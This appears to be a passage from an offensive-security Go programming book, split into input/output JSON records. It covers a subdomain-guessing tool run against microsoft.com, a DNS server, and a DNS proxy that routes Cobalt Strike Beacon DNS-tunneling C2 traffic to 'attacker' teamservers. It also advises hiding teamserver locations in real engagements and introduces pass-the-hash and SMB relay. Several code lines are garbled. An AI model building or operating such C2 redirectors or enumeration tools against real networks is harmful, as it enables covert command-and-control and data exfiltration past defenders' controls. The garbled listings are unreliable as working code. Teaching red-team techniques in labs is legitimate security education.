{\nips = append(ips, a.A.String())\nreturn ips, nil\n}\n}\nreturn ips, nil\n}\nfunc lookupCNAME(fqdn, serverAddr string) ([]string, error) {\nvar m dns.Msg\nvar fqdns []string\nm.SetQuestion(dns.Fqdn(fqdn), dns.TypeCNAME)\nin, err := dns.Exchange(&m, serverAddr)\nif err != nil {\nreturn fqdns, err\n}\nif len(in.Answer) < 1 {\nreturn fqdns, errors.New(\"no answer\")\n}\nfor _, answer := range in.Answer {\nif c, ok := answer.(*dns.CNAME); ok {\nfqdns = append(fqdns, c.Target)\n}\n}\nreturn fqdns, nil\n}\nfunc lookup(fqdn, serverAddr string) []result {\nvar results []result\nvar cfqdn = fqdn // Don't modify the original.\nFor {\ncnames, err := lookupCNAME(cfqdn, serverAddr)\nif err == nil && len(cnames) > 0 {\ncfqdn = cnames[0]\ncontinue // We have to process the next CNAME.\n}\nips, err := lookupA(cfqdn, serverAddr)\nif err != nil {\nbreak // There are no A records for this hostname.\n}\nfor _, ip := range ips {\nresults = append(results, result{IPAddress: ip, Hostname: fqdn})\n}\nbreak // We have processed all the results.\n}\nreturn results\n}\nfunc worker(tracker chan empty, fqdns chan string, gather chan []result,\nserverAddr string) {\nfor fqdn := range fqdns {\nresults := lookup(fqdn, serverAddr)\nif len(results) > 0 {\ngather <- results\n}\n}\nvar e empty\ntracker <- e\n}\ntype empty struct{}\ntype result struct {\nIPAddress string\nHostname string\n}\nfunc main() {\nvar (\nflDomain = flag.String(\"domain\", \"\", \"The domain to perform guessing\nagainst.\")\nflWordlist = flag.String(\"wordlist\", \"\", \"The wordlist to use for guessing.\")\nflWorkerCount = flag.Int(\"c\", 100, \"The amount of workers to use.\")\nflServerAddr = flag.String(\"server\", \"8.8.8.8:53\", \"The DNS server to use.\")\n)\nflag.Parse()\nif *flDomain == \"\" || *flWordlist == \"\" {\nfmt.Println(\"-domain and -wordlist are required\")\nos.Exit(1)\n}\nvar results []result\nfqdns := make(chan string, *flWorkerCount)\ngather := make(chan []result)\ntracker := make(chan empty)\nfh, err := os.Open(*flWordlist)\nif err != nil {\npanic(err)\n}\ndefer fh.Close()\nscanner := bufio.NewScanner(fh)\nfor I := 0; i < *flWorkerCount; i++ {\ngo worker(tracker, fqdns, gather, *flServerAddr)\n}\nfor scanner.Scan() {\nfqdns <- fmt.Sprintf\"%s.%\", scanner.Text(), *flDomain)\n}\n// Note: We could check scanner.Err() here.\ngo func() {\nfor r := range gather {\nresults = append(results, I.)\n}\nvar e empty\ntracker <- e\n}()\nclose(fqdns)\nfor i := 0; i < *flWorkerCount; i++ {\n<-tracker\n}\nclose(gather)\n<-tracker\nw := tabwriter.NewWriter(os.Stdout, 0, 8' ', ' ', 0)\nfor _, r := range results {\nfmt.Fprint\"(w, \"%s\\\"%s\\n\", r.Hostname, r.IPAddress)\n}\nw.Flush()\n}\nListing 5-4: The complete subdomain-guessing program (/ch-\n5/subdomain_guesser/main.go)\nYour subdomain-guessing program is complete! You\nshould now be able to build and execute your shiny new\nsubdomain-guessing tool. Try it with word lists or dictionary\nfiles in open source repositories (you can find plenty with a\nGoogle search). Play around with the number of workers; you\nmay find that if you go too fast, you’ll get varying results.\nHere’s a run from the authors’ system using 100 workers:\n$ wc -l namelist.txt\n1909 namelist.txt\n$ time ./subdomain_guesser -domain microsoft.com -wordlist namelist.txt -c\n1000\najax.microsoft.com 72.21.81.200\nbuy.microsoft.com 157.56.65.82\nnews.microsoft.com 192.230.67.121\napplications.microsoft.com 168.62.185.179\nsc.microsoft.com 157.55.99.181\nopen.microsoft.com 23.99.65.65\nra.microsoft.com 131.107.98.31\nris.microsoft.com 213.199.139.250\nsmtp.microsoft.com 205.248.106.64\nwallet.microsoft.com 40.86.87.229\njp.microsoft.com 134.170.185.46\nftp.microsoft.com 134.170.188.232\ndevelop.microsoft.com 104.43.195.251"
  },
  {
    "input": "Writing DNS Servers",
    "output": "./subdomain_guesser -domain microsoft.com -wordlist namelist.txt -c 1000 0.23s\nuser 0.67s system 22% cpu 4.040 total\nYou’ll see that the output shows several FQDNs and their\nIP addresses. We were able to guess the subdomain values for\neach result based off the word list provided as an input file.\nNow that you’ve built your own subdomain-guessing tool\nand learned how to resolve hostnames and IP addresses to\nenumerate different DNS records, you’re ready to write your\nown DNS server and proxy.\nWRITING DNS SERVERS\nAs Yoda said, “Always two there are, no more, no less.” Of\ncourse, he was talking about the client-server relationship, and\nsince you’re a master of clients, now is the time to become a\nmaster of servers. In this section, you’ll use the Go DNS\npackage to write a basic server and a proxy. You can use DNS\nservers for several nefarious activities, including but not\nlimited to tunneling out of restrictive networks and conducting\nspoofing attacks by using fake wireless access points.\nBefore you begin, you’ll need to set up a lab environment.\nThis lab environment will allow you to simulate realistic\nscenarios without having to own legitimate domains and use\ncostly infrastructure, but if you’d like to register domains and\nuse a real server, please feel free to do so.\nLab Setup and Server Introduction\nYour lab consists of two virtual machines (VMs): a Microsoft\nWindows VM to act as client and an Ubuntu VM to act as\nserver. This example uses VMWare Workstation along with\nBridged network mode for each machine; you can use a\nprivate virtual network, but make sure that both machines are\non the same network. Your server will run two Cobalt Strike\nDocker instances built from the official Java Docker image\n(Java is a prerequisite for Cobalt Strike). Figure 5-1 shows\nwhat your lab will look like.\nFigure 5-1: The lab setup for creating your DNS server\nFirst, create the Ubuntu VM. To do this, we’ll use version\n16.04.1 LTS. No special considerations need to be made, but\nyou should configure the VM with at least 4 gigabytes of\nmemory and two CPUs. You can use an existing VM or host if\nyou have one. After the operating system has been installed,\nyou’ll want to install a Go development environment (see\nChapter 1).\nOnce you’ve created the Ubuntu VM, install a\nvirtualization container utility called Docker. In the proxy\nsection of this chapter, you’ll use Docker to run multiple\ninstances of Cobalt Strike. To install Docker, run the following\nin your terminal window:\n$ sudo apt-get install apt-transport-https ca-certificates\nsudo apt-key adv \\\n--keyserver hkp://ha.pool.sks-keyservers.net:80 \\\n--recv-keys 58118E89F3A912897C070ADBF76221572C52609D\n$ echo \"deb https://apt.dockerproject.org/repo ubuntu-xenial main\" | sudo tee\n/etc/apt/sources.list.d/docker.list\n$ sudo apt-get update\n$ sudo apt-get install linux-image-extra-$(uname -r) linux-image-extra-virtual\n$ sudo apt-get install docker-engine\n$ sudo service docker start\n$ sudo usermod -aG docker USERNAME\nAfter installing, log out and log back into your system.\nNext, verify that Docker has been installed by running the\nfollowing command:\n$ docker version\nClient:\nVersion: 1.13.1\nAPI version: 1.26\nGo version: go1.7.5\nGit commit: 092cba3\nBuilt: Wed Feb 5 06:50:14 2020\nOS/Arch: linux/amd64\nWith Docker installed, use the following command to\ndownload a Java image. This command pulls down the base\nDocker Java image but doesn’t create any containers. You’re\ndoing this to prepare for your Cobalt Strike builds shortly.\n$ docker pull java\nFinally, you need to ensure that dnsmasq isn’t running,\nbecause it listens on port 53. Otherwise, your own DNS\nservers won’t be able to operate, since they’re expected to use\nthe same port. Kill the process by ID if it’s running:\nHivaNetwork.Com\n$ ps -ef | grep dnsmasq\nnobody 3386 2020 0 12:08\n$ sudo kill 3386\nNow create a Windows VM. Again, you can use an\nexisting machine if available. You don’t need any special\nsettings; minimal settings will do. Once the system is\nfunctional, set the DNS server to the IP address of the Ubuntu\nsystem.\nTo test your lab setup and to introduce you to writing DNS\nservers, start by writing a basic server that returns only A\nrecords. In your GOPATH on the Ubuntu system, create a new\ndirectory called github.com/blackhat-go/bhg/ch-5/a_server\nand a file to hold your main.go code. Listing 5-5 shows the\nentire code for creating a simple DNS server.\npackage main\nimport (\n\"log\"\n\"net\"\n\"github.com/miekg/dns\"\n)\nfunc main() {\n❶ dns.HandleFunc(\".\", func(w dns.ResponseWriter, req *dns.Msg) {\n❷ var resp dns.Msg\nresp.SetReply(req)\nfor _, q := range req.Question {\n❸ a := dns.A{\nHdr: dns.RR_Header{\nName: q.Name,\nRrtype: dns.TypeA,\nClass: dns.ClassINET,\nTtl: 0,\n},\nA: net.ParseIP(\"127.0.0.1\").To4(),\n}\n❹ resp.Answer = append(resp.Answer, &a)\n}\n❺ w.WriteMsg(&resp)\n})\n❻ log.Fatal(dns.ListenAndServe(\":53\", \"udp\", nil))\n}\nListing 5-5: Writing a DNS server (/ch-5/a_server/main.go)\nThe server code starts with a call to HandleFunc() ❶; it looks\na lot like the net/http package. The function’s first argument is a\nquery pattern to match. You’ll use this pattern to indicate to\nthe DNS servers which requests will be handled by the\nsupplied function. By using a period, you’re telling the server\nthat the function you supply in the second argument will\nhandle all requests.\nThe next argument passed to HandleFunc() is a function\ncontaining the logic for the handler. This function receives two\narguments: a ResponseWriter and the request itself. Inside the\nhandler, you start by creating a new message and setting the\nreply ❷. Next, you create an answer for each question, using\nan A record, which implements the RR interface. This portion\nwill vary depending on the type of answer you’re looking for\n❸. The pointer to the A record is appended to the response’s\nAnswer field by using append() ❹. With the response complete,\nyou can write this message to the calling client by using\nw.WriteMsg() ❺. Finally, to start the server, ListenAndServe() is\ncalled ❻. This code resolves all requests to an IP address of\n127.0.0.1.\nOnce the server is compiled and started, you can test it by\nusing dig. Confirm that the hostname for which you’re\nquerying resolves to 127.0.0.1. That indicates it’s working as\ndesigned.\n$ dig @localhost facebook.com\n; <<>> DiG 9.10.3-P4-Ubuntu <<>> @localhost facebook.com\n; (1 server found)\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 33594\n;; flags: qr rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0\n;; WARNING: recursion requested but not available\n;; QUESTION SECTION:\n;facebook.com. IN A\n;; ANSWER SECTION:\nfacebook.com. 0 IN A 127.0.0.1\n;; Query time: 0 msec\n;; SERVER: 127.0.0.1#53(127.0.0.1)\n;; WHEN: Sat Dec 19 13:13:45 MST 2020\n;; MSG SIZE rcvd: 58\nNote that the server will need to be started with sudo or a\nroot account, because it listens on a privileged port—port 53.\nIf the server doesn’t start, you may need to kill dnsmasq.\nCreating DNS Server and Proxy\nDNS tunneling, a data exfiltration technique, can be a great\nway to establish a C2 channel out of networks with restrictive\negress controls. If using an authoritative DNS server, an\nattacker can route through an organization’s own DNS servers\nand out through the internet without having to make a direct\nconnection to their own infrastructure. Although slow, it’s\ndifficult to defend against. Several open source and proprietary\npayloads perform DNS tunneling, one of which is Cobalt\nStrike’s Beacon. In this section, you’ll write your own DNS\nserver and proxy and learn how to multiplex DNS tunneling\nC2 payloads by using Cobalt Strike.\nConfiguring Cobalt Strike\nIf you’ve ever used Cobalt Strike, you may have noticed that,\nby default, the teamserver listens on port 53. Because of this,\nand by the recommendation of the documentation, only a\nsingle server should ever be run on a system, maintaining a\none-to-one ratio. This can become problematic for medium-to-\nlarge teams. For example, if you have 20 teams conducting\noffensive engagements against 20 separate organizations,\nstanding up 20 systems capable of running the teamserver\ncould be difficult. This problem isn’t unique to Cobalt Strike\nand DNS; it’s applicable to other protocols, including HTTP\npayloads, such as Metasploit Meterpreter and Empire.\nAlthough you could establish listeners on a variety of\ncompletely unique ports, there’s a greater probability of\negressing traffic over common ports such as TCP 80 and 443.\nSo the question becomes, how can you and other teams share a\nsingle port and route to multiple listeners? The answer is with\na proxy, of course. Back to the lab.\nNOTE\nIn real engagements, you’d want to have multiple levels of subterfuge,\nabstraction, and forwarding to disguise the location of your teamserver.\nThis can be done using UDP and TCP forwarding through small utility\nservers using various hosting providers. The primary teamserver and proxy\ncan also run on separate systems, having the teamserver cluster on a\nlarge system with plenty of RAM and CPU power.\nLet’s run two instances of Cobalt Strike’s teamserver in\ntwo Docker containers. This allows the server to listen on port\n53 and lets each teamserver have what will effectively be their\nown system and, consequently, their own IP stack. You’ll use\nDocker’s built-in networking mechanism to map UDP ports to\nthe host from the container. Before you begin, download a trial\nversion of Cobalt Strike at https://trial.cobaltstrike.com/. After\nfollowing the trial sign-up instructions, you should have a\nfresh tarball in your download directory. You’re now ready to\nstart the teamservers.\nExecute the following in a terminal window to start the first\ncontainer:\n$ docker run --rm❶ -it❷ -p 2020:53❸ -p 50051:50050❹ -v❺ full path to\ncobalt strike download:/data❻ java❼ /bin/bash❽\nThis command does several things. First, you tell Docker to\nremove the container after it exits ❶, and that you’d like to\ninteract with it after starting ❷. Next, you map port 2020 on\nyour host system to port 53 in the container ❸, and port 50051\nto port 50050 ❹. Next, you map the directory containing the\nCobalt Strike tarball ❺ to the data directory on the container\n❻. You can specify any directory you want and Docker will\nhappily create it for you. Finally, provide the image you want\nto use (in this case, Java) ❼ and the command ❽ you’d like to\nexecute on startup. This should leave you with a bash shell in\nthe running Docker container.\nOnce inside the Docker container, start the teamserver by\nexecuting the following commands:\n$ cd /root\n$ tar -zxvf /data/cobaltstrike-trial.tgz\n$ cd cobaltstrike\n$ ./teamserver <IP address of host> <some password>\nThe IP address provided should be that of your actual VM,\nnot the IP address of the container.\nNext, open a new terminal window on the Ubuntu host and\nchange into the directory containing the Cobalt Strike tarball.\nExecute the following commands to install Java and start the\nCobalt Strike client:\n$ sudo add-apt-repository ppa:webupd8team/java\n$ sudo apt update\n$ sudo apt install oracle-java8-installer\n$ tar -zxvf cobaltstrike-trial.tgz\n$ cd cobaltstrike\n$ ./cobaltstrike\nThe GUI for Cobalt Strike should start up. After clearing\nthe trial message, change the teamserver port to 50051 and set\nyour username and password accordingly.\nYou’ve successfully started and connected to a server\nrunning completely in Docker! Now, let’s start a second server\nby repeating the same process. Follow the previous steps to\nstart a new teamserver. This time, you’ll map different ports.\nIncrementing the ports by one should do the trick and is\nlogical. In a new terminal window, execute the following\ncommand to start a new container and listen on ports 2021 and\n50052:\n$ docker run --rm -it -p 2021:53 -p 50052:50050-v full path to cobalt strike\ndownload:/data java /bin/bash\nFrom the Cobalt Strike client, create a new connection by\nselecting Cobalt Strike ▶ New Connection, modifying the\nport to 50052, and selecting Connect. Once connected, you\nshould see two tabs at the bottom of the console, which you\ncan use to switch between servers.\nNow that you’ve successfully connected to the two\nteamservers, you should start two DNS listeners. To create a\nlistener, select Configure Listeners from the menu; its icon\nlooks like a pair of headphones. Once there, select Add from\nthe bottom menu to bring up the New Listener window. Enter\nthe following information:\nName: DNS 1\nPayload: windows/beacon_dns/reverse_dns_txt\nHost: <IP address of host>\nPort: 0\nIn this example, the port is set to 80, but your DNS payload\nstill uses port 53, so don’t worry. Port 80 is specifically used\nfor hybrid payloads. Figure 5-2 shows the New Listener\nwindow and the information you should be entering.\nFigure 5-2: Adding a new listener\nNext, you’ll be prompted to enter the domains to use for\nbeaconing, as shown in Figure 5-3.\nEnter the domain attacker1.com as the DNS beacon, which\nshould be the domain name to which your payload beacons.\nYou should see a message indicating that a new listener has\nstarted. Repeat the process within the other teamserver, using\nDNS 2 and attacker2.com. Before you start using these two\nlisteners, you’ll need to write an intermediary server that\ninspects the DNS messages and routes them appropriately.\nThis, essentially, is your proxy.\nFigure 5-3: Adding the DNS beacon’s domain\nCreating a DNS Proxy\nThe DNS package you’ve been using throughout this chapter\nmakes writing an intermediary function easy, and you’ve\nalready used some of these functions in previous sections.\nYour proxy needs to be able to do the following:\nCreate a handler function to ingest an incoming query\nInspect the question in the query and extract the domain name\nIdentify the upstream DNS server correlating to the domain name\nExchange the question with the upstream DNS server and write the response to\nthe client\nYour handler function could be written to handle\nattacker1.com and attacker2.com as static values, but that’s\nnot maintainable. Instead, you should look up records from a\nresource external to the program, such as a database or a\nconfiguration file. The following code does this by using the\nformat of domain,server, which lists the incoming domain and\nupstream server separated by a comma. To start your program,\ncreate a function that parses a file containing records in this\nformat. The code in Listing 5-6 should be written into a new\nfile called main.go.\npackage main\nimport (\n\"bufio\"\n\"fmt\"\n\"os\"\n\"strings\"\n)\n❶ func parse(filename string) (map[string]string❷, error) {\nrecords := make(map[string]string)\nfh, err := os.Open(filename)\nif err != nil {\nreturn records, err\n}\ndefer fh.Close()\nscanner := bufio.NewScanner(fh)\nfor scanner.Scan() {\nline := scanner.Text()\nparts := strings.SplitN(line, \",\", 2)\nif len(parts) < 2 {\nreturn records, fmt.Errorf(\"%s is not a valid line\", line)\n}\nrecords[parts[0]] = parts[1]\n}\nreturn records, scanner.Err()\nHivaNetwork.Com\n}\nfunc main() {\nrecords, err := parse(\"proxy.config\")\nif err != nil {\npanic(err)\n}\nfmt.Printf(\"%+v\\n\", records)\n}\nListing 5-6: Writing a DNS proxy (/ch-5/dns_proxy/main.go)\nWith this code, you first define a function ❶ that parses a\nfile containing the configuration information and returns a\nmap[string]string ❷. You’ll use that map to look up the incoming\ndomain and retrieve the upstream server.\nEnter the first command in the following code into your\nterminal window, which will write the string after echo into a\nfile called proxy.config. Next, you should compile and execute\ndns_proxy.go.\n$ echo 'attacker1.com,127.0.0.1:2020\\nattacker2.com,127.0.0.1:2021' >\nproxy.config\n$ go build\n$ ./dns_proxy\nmap[attacker1.com:127.0.0.1:2020 attacker2.com:127.0.0.1:2021]\nWhat are you looking at here? The output is the mapping\nbetween teamserver domain names and the port on which the\nCobalt Strike DNS server is listening. Recall that you mapped\nports 2020 and 2021 to port 53 on your two separate Docker\ncontainers. This is a quick and dirty way for you to create\nbasic configuration for your tool so you don’t have to store it\nin a database or other persistent storage mechanism.\nWith a map of records defined, you can now write the\nhandler function. Let’s refine your code, adding the following\nto your main() function. It should follow the parsing of your\nconfig file.\n❶ dns.HandleFunc(\".\",func(w dns.ResponseWriter, req *dns.Msg)❷ {\n❸ if len(req.Question) < 1 {\ndns.HandleFailed(w, req)\nreturn\n}\n❹ name := req.Question[0].Name\nparts := strings.Split(name, \".\")\nif len(parts) > 1 {\n❺ name = strings.Join(parts[len(parts)-2:], \".\")\n}\n❻ match, ok:= records[name]\nif !ok {\ndns.HandleFailed(w, req)\nreturn\n}\n❼ resp, err := dns.Exchange(req, match)\nif err != nil {\ndns.HandleFailed(w, req)\nreturn\n}\n❽ if err := w.WriteMsg(resp); err != nil {\ndns.HandleFailed(w, req)\nreturn\n}\n})\n❾ log.Fatal(dns.ListenAndServe(\":53\", \"udp\", nil))\nTo begin, call HandleFunc() with a period to handle all\nincoming requests ❶, and define an anonymous function ❷,\nwhich is a function that you don’t intend to reuse (it has no\nname). This is good design when you have no intention to\nreuse a block of code. If you intend to reuse it, you should\ndeclare and call it as a named function. Next, inspect the\nincoming questions slice to ensure that at least one question is\nprovided ❸, and if not, call HandleFailed() and return to exit the\nfunction early. This is a pattern used throughout the handler. If\nat least a single question does exist, you can safely pull the\nrequested name from the first question ❹. Splitting the name\nby a period is necessary to extract the domain name. Splitting\nthe name should never result in a value less than 1, but you\nshould check it to be safe. You can grab the tail of the slice—\nthe elements at the end of the slice—by using the slice operator\non the slice ❺. Now, you need to retrieve the upstream server\nfrom the records map.\nRetrieving a value from a map ❻ can return one or two\nvariables. If the key (in our case, a domain name) is present on\nthe map, it will return the corresponding value. If the domain\nisn’t present, it will return an empty string. You could check if\nthe returned value is an empty string, but that would be\ninefficient when you start working with types that are more\ncomplex. Instead, assign two variables: the first is the value\nfor the key, and the second is a Boolean that returns true if the\nkey is found. After ensuring a match, you can exchange the\nrequest with the upstream server ❼. You’re simply making\nsure that the domain name for which you’ve received the\nrequest is configured in your persistent storage. Next, write the\nresponse from the upstream server to the client ❽. With the\nhandler function defined, you can start the server ❾. Finally,\nyou can now build and start the proxy.\nWith the proxy running, you can test it by using the two\nCobalt Strike listeners. To do this, first create two stageless\nexecutables. From Cobalt Strike’s top menu, click the icon that\nlooks like a gear, and then change the output to Windows Exe.\nRepeat this process from each teamserver. Copy each of these\nexecutables to your Windows VM and execute them. The\nDNS server of your Windows VM should be the IP address of\nyour Linux host. Otherwise, the test won’t work.\nIt may take a moment or two, but eventually you should see\na new beacon on each teamserver. Mission accomplished!\nFinishing Touches\nThis is great, but when you have to change the IP address of\nyour teamserver or redirector, or if you have to add a record,\nyou’ll have to restart the server as well. Your beacons would\nlikely survive such an action, but why take the risk when\nthere’s a much better option? You can use process signals to\ntell your running program that it needs to reload the\nconfiguration file. This is a trick that I first learned from Matt\nHolt, who implemented it in the great Caddy Server. Listing 5-\n7 shows the program in its entirety, complete with process\nsignaling logic:\npackage main\nimport (\n\"bufio\"\n\"fmt\"\n\"log\"\n\"os\"\n\"os/signal\"\n\"strings\"\n\"sync\"\n\"syscall\"\n\"github.com/miekg/dns\"\n)\nfunc parse(filename string) (map[string]string, error) {\nrecords := make(map[string]string)\nfh, err := os.Open(filename)\nif err != nil {\nreturn records, err\n}\ndefer fh.Close()\nscanner := bufio.NewScanner(fh)\nfor scanner.Scan() {\nline := scanner.Text()\nparts := strings.SplitN(line, \",\", 2)\nif len(parts) < 2 {\nreturn records, fmt.Errorf(\"%s is not a valid line\", line)\n}\nrecords[parts[0]] = parts[1]\n}\nlog.Println(\"records set to:\")\nfor k, v := range records {\nfmt.Printf(\"%s -> %s\\n\", k, v)\n}\nreturn records, scanner.Err()\n}\nfunc main() {\n❶ var recordLock sync.RWMutex\nrecords, err := parse(\"proxy.config\")\nif err != nil {\npanic(err)\n}\ndns.HandleFunc(\".\", func(w dns.ResponseWriter, req *dns.Msg) {\nif len(req.Question) == 0 {\ndns.HandleFailed(w, req)\nreturn\n}\nfqdn := req.Question[0].Name\nparts := strings.Split(fqdn, \".\")\nif len(parts) >= 2 {\nfqdn = strings.Join(parts[len(parts)-2:], \".\")\n}\n❷ recordLock.RLock()\nmatch := records[fqdn]\n❸ recordLock.RUnlock()\nif match == \"\" {\ndns.HandleFailed(w, req)\nreturn\n}\nresp, err := dns.Exchange(req, match)\nif err != nil {\ndns.HandleFailed(w, req)\nreturn\n}\nif err := w.WriteMsg(resp); err != nil {\ndns.HandleFailed(w, req)\nreturn\n}\n})\n❹ go func() {\n❺ sigs := make(chan os.Signal, 1)\n❻ signal.Notify(sigs, syscall.SIGUSR1)\nfor sig := range sigs {\n❼ switch sig {\ncase syscall.SIGUSR1:\nlog.Println(\"SIGUSR1: reloading records\")\n❽ recordLock.Lock()\nparse(\"proxy.config\")\n❾ recordLock.Unlock()\n}\n}\n}()\nlog.Fatal(dns.ListenAndServe(\":53\", \"udp\", nil))\n}\nListing 5-7: Your completed proxy (/ch-5/dns_proxy/main.go)\nThere are a few additions. Since the program is going to be\nmodifying a map that could be in use by concurrent\ngoroutines, you’ll need to use a mutex to control access.1 A\nmutex prevents concurrent execution of sensitive code blocks,\nallowing you to lock and unlock access. In this case, you can\nuse RWMutex ❶, which allows any goroutine to read without\nlocking the others out, but will lock the others out when a\nwrite is occurring. Alternatively, implementing goroutines\nwithout a mutex on your resource will introduce interleaving,\nwhich could result in race conditions or worse.\nBefore accessing the map in your handler, call RLock ❷ to\nread a value to match; after the read is complete, RUnlock ❸ is\ncalled to release the map for the next goroutine. In an\nanonymous function that’s running within a new goroutine ❹,\nyou begin the process of listening for a signal. This is done\nusing a channel of type os.Signal ❺, which is provided in the\ncall to signal.Notify() ❻ along with the literal signal to be\nconsumed by the SIGUSR1 channel, which is a signal set aside\nfor arbitrary purposes. In a loop over the signals, use a switch\nstatement ❼ to identify the type of signal that has been\nreceived. You’re configuring only a single signal to be\nmonitored, but in the future you might change this, so this is\nan appropriate design pattern. Finally, Lock() ❽ is used prior to\nreloading the running configuration to block any goroutines\nthat may be trying to read from the record map. Use Unlock() ❾\nto continue execution.\nLet’s test this program by starting the proxy and creating a\nnew listener within an existing teamserver. Use the domain\nattacker3.com. With the proxy running, modify the\nproxy.config file and add a new line pointing the domain to\nyour listener. You can signal the process to reload its"
  },
  {
    "input": "Summary",
    "output": "configuration by using kill, but first use ps and grep to identify\nthe process ID.\n$ ps -ef | grep proxy\n$ kill -10 PID\nThe proxy should reload. Test it by creating and executing\na new stageless executable. The proxy should now be\nfunctional and production ready.\nSUMMARY\nAlthough this concludes the chapter, you still have a world of\npossibilities for your code. For example, Cobalt Strike can\noperate in a hybrid fashion, using HTTP and DNS for different\noperations. To do this, you’ll have to modify your proxy to\nrespond with the listener’s IP for A records; you’ll also need to\nforward additional ports to your containers. In the next\nchapter, you’ll delve into the convoluted craziness that is SMB\nand NTLM. Now, go forth and conquer!"
  },
  {
    "input": "6 INTERACTING WITH SMB AND NTLM",
    "output": "6\nINTERACTING WITH SMB AND NTLM\nIn the previous chapters, you examined various common\nprotocols used for network communication, including raw\nTCP, HTTP, and DNS. Each of these protocols has interesting\nuse cases for attackers. Although an extensive number of other\nnetwork protocols exist, we’ll conclude our discussion of\nnetwork protocols by examining Server Message Block (SMB),\na protocol that arguably proves to be the most useful during\nWindows post-exploitation.\nSMB is perhaps the most complicated protocol you’ll see\nin this book. It has a variety of uses, but SMB is commonly\nused for sharing resources such as files, printers, and serial\nports across a network. For the offensive-minded reader, SMB\nallows interprocess communications between distributed\nnetwork nodes via named pipes. In other words, you can\nexecute arbitrary commands on remote hosts. This is\nessentially how PsExec, a Windows tool that executes remote\ncommands locally, works.\nSMB has several other interesting use cases, particularly"
  },
  {
    "input": "The SMB Package",
    "output": "due to the way it handles NT LAN Manager (NTLM)\nauthentication, a challenge-response security protocol used\nheavily on Windows networks. These uses include remote\npassword guessing, hash-based authentication (or pass-the-\nhash), SMB relay, and NBNS/LLMNR spoofing. Covering\neach of these attacks would take an entire book.\nWe’ll begin this chapter with a detailed explanation of how\nto implement SMB in Go. Next, you’ll leverage the SMB\npackage to perform remote password guessing, use the pass-\nthe-hash technique to successfully authenticate yourself by\nusing only a password’s hash, and crack the NTLMv2 hash of\na password.\nTHE SMB PACKAGE\nAt the time of this writing, no official SMB package exists in\nGo, but we created a package where you can find the book-\nfriendly version at https://github.com/blackhat-\ngo/bhg/blob/master/ch-6/smb/. Although we won’t show you\nevery detail of this package in this chapter, you’ll still learn\nthe basics of interpreting the SMB specification in order to\ncreate the binary communications necessary to “speak SMB,”\nunlike in previous chapters, where you simply reused fully\ncompliant packages. You’ll also learn how to use a technique\ncalled reflection to inspect interface data types at runtime and\ndefine arbitrary Go structure field tags to marshal and\nunmarshal complicated, arbitrary data, while maintaining\nscalability for future message structures and data types.\nWhile the SMB library we’ve built allows only basic\nclient-side communications, the codebase is fairly extensive.\nHivaNetwork.Com"
  },
  {
    "input": "Understanding SMB",
    "output": "You’ll see relevant examples from the SMB package so that\nyou can fully understand how communications and tasks, such\nas SMB authentication, work.\nUNDERSTANDING SMB\nSMB is an application-layer protocol, like HTTP, that allows\nnetwork nodes to communicate with one another. Unlike\nHTTP 1.1, which communicates using ASCII-readable text,\nSMB is a binary protocol that uses a combination of fixed- and\nvariable-length, positional, and little-endian fields. SMB has\nseveral versions, also known as dialects—that is, versions 2.0,\n2.1, 3.0, 3.0.2, and 3.1.1. Each dialect performs better than its\npredecessors. Because the handling and requirements vary\nfrom one dialect to the next, a client and server must agree on\nwhich dialect to use ahead of time. They do this during an\ninitial message exchange.\nGenerally, Windows systems support multiple dialects and\nchoose the most current dialect that both the client and server\nsupport. Microsoft has provided Table 6-1, which shows\nwhich Windows versions select which dialect during the\nnegotiation process. (Windows 10 and WS 2016—not shown\nin the graphic—negotiate SMB version 3.1.1.)\nTable 6-1: SMB Dialects Negotiated By Windows Versions\nOperating Window Window Window Window Previous\nsystem s 8.1 WS s 8 WS s 7 WS s Vista versions\n2012 R2 2012 2008 R2 WS\n2008\nWindows SMB SMB 3.0 SMB 2.1 SMB 2.0 SMB 1.0\n8.1 3.02\nWS 2012 R2\nWindows 8 SMB 3.0 SMB 3.0 SMB 2.1 SMB 2.0 SMB 1.0\nWS 2012\nWindows 7 SMB 2.1 SMB 2.1 SMB 2.1 SMB 2.0 SMB 1.0\nWS 2008 R2\nWindows SMB 2.0 SMB 2.0 SMB 2.0 SMB 2.0 SMB 1.0\nVista\nWS 2008\nPrevious SMB 1.0 SMB 1.0 SMB 1.0 SMB 1.0 SMB 1.0\nversions\nFor this chapter, you’ll use the SMB 2.1 dialect, because\nmost modern Windows versions support it.\nUnderstanding SMB Security Tokens\nSMB messages contain security tokens used to authenticate\nusers and machines across a network. Much like the process of\nselecting the SMB dialect, selecting the authentication\nmechanism takes place through a series of Session Setup\nmessages, which allow clients and servers to agree on a\nmutually supported authentication type. Active Directory\ndomains commonly use NTLM Security Support Provider\n(NTLMSSP), a binary, positional protocol that uses NTLM\npassword hashes in combination with challenge-response\ntokens in order to authenticate users across a network.\nChallenge-response tokens are like the cryptographic answer\nto a question; only an entity that knows the correct password\ncan answer the question correctly. Although this chapter\nfocuses solely on NTLMSSP, Kerberos is another common\nauthentication mechanism.\nSeparating the authentication mechanism from the SMB\nspecification itself allows SMB to use different authentication\nmethods in different environments, depending on domain and\nenterprise security requirements as well as client-server\nsupport. However, separating the authentication and the SMB\nspecification makes it more difficult to create an\nimplementation in Go, because the authentication tokens are\nAbstract Syntax Notation One (ASN.1) encoded. For this\nchapter, you don’t need to know too much about ASN.1—just\nknow that it’s a binary encoding format that differs from the\npositional binary encoding you’ll use for general SMB. This\nmixed encoding adds complexity.\nUnderstanding NTLMSSP is crucial to creating an SMB\nimplementation that is smart enough to marshal and unmarshal\nmessage fields selectively, while accounting for the potential\nthat adjacent fields—within a single message—may be\nencoded or decoded differently. Go has standard packages that\nyou can use for binary and ASN.1 encoding, but Go’s ASN.1\npackage wasn’t built for general-purpose use; so you must take\ninto account a few nuances.\nSetting Up an SMB Session\nThe client and server perform the following process to\nsuccessfully set up an SMB 2.1 session and choose the\nNTLMSSP dialect:\n1. The client sends a Negotiate Protocol request to the server. The message\nincludes a list of dialects that the client supports.\n2. The server responds with a Negotiate Protocol response message, which\nindicates the dialect the server selected. Future messages will use that dialect.\nIncluded in the response is a list of authentication mechanisms the server\nsupports.\n3. The client selects a supported authentication type, such as NTLMSSP, and uses\nthe information to create and send a Session Setup request message to the server.\nThe message contains an encapsulated security structure indicating that it’s an\nNTLMSSP Negotiate request.\n4. The server replies with a Session Setup response message. This message\nindicates that more processing is required and includes a server challenge token.\n5. The client calculates the user’s 